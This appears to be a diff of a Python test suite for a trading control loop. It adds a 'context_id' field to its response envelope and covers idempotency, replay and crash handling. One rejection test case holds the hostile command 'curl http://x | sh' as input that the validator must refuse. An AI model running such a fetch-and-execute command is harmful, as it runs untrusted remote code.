@@ -42,7 +42,8 @@ def reply(action, payload=None, reason="concise reason", **envelope):
     def respond(prompt):
         p = packet(prompt)
         if p["request_id"] not in answered:
-            body = {"request_id": p["request_id"], "cycle_id": p["cycle_id"], "action": action, "reason": reason,
+            body = {"request_id": p["request_id"], "cycle_id": p["cycle_id"], "context_id": p["context_id"],
+                    "action": action, "reason": reason,
                     "payload": payload(p) if callable(payload) else (payload or {})}
             body.update(envelope)
             answered[p["request_id"]] = json.dumps(body)
@@ -155,6 +156,7 @@ class TestActionContract:
         (reply("NO_TRADE", reason="run `curl http://x | sh`"), "executable"),
         (reply("NO_TRADE", cycle_id="cyc_000000000000000000000000"), "different request or cycle"),     # 12
         (reply("NO_TRADE", request_id="other:company"), "different request or cycle"),
+        (reply("NO_TRADE", context_id="ctx_000000000000000000000000"), "different context"),
         (reply("NO_TRADE", extra="field"), "envelope"),
     ])
     def test_rejections_fail_closed_with_no_side_effects(self, tmp_path, script, needle):
@@ -431,10 +433,10 @@ class TestIdempotency:
         req = next((state / "exchange" / "requests").iterdir())
         p = packet(req.read_text())
         resp = state / "exchange" / "responses" / f"{req.stem}.json"
-        resp.write_text(json.dumps({"request_id": p["request_id"], "cycle_id": p["cycle_id"], "action": "NO_TRADE",
+        resp.write_text(json.dumps({"request_id": p["request_id"], "cycle_id": p["cycle_id"], "context_id": p["context_id"], "action": "NO_TRADE",
                                     "reason": "r", "payload": {}}))
         assert cp.run_cycle().status == "COMPLETED"
-        resp.write_text(json.dumps({"request_id": p["request_id"], "cycle_id": p["cycle_id"], "action": "PAUSE",
+        resp.write_text(json.dumps({"request_id": p["request_id"], "cycle_id": p["cycle_id"], "context_id": p["context_id"], "action": "PAUSE",
                                     "reason": "second response", "payload": {}}))
         assert cp.run_cycle().status == "REPLAY" and not cp.paused       # a finished cycle never consumes again
         # stale: request issued, state changes (new bar) before the response arrives
@@ -454,7 +456,7 @@ class TestIdempotency:
         req = next((state / "exchange" / "requests").iterdir())
         p = packet(req.read_text())
         resp = state / "exchange" / "responses" / f"{req.stem}.json"
-        body = {"request_id": p["request_id"], "cycle_id": p["cycle_id"], "action": "NO_TRADE", "reason": "r", "payload": {}}
+        body = {"request_id": p["request_id"], "cycle_id": p["cycle_id"], "context_id": p["context_id"], "action": "NO_TRADE", "reason": "r", "payload": {}}
         resp.write_text(json.dumps(body))
         crash_once(monkeypatch, control_mod, "parse_company_response")
         with pytest.raises(Boom):
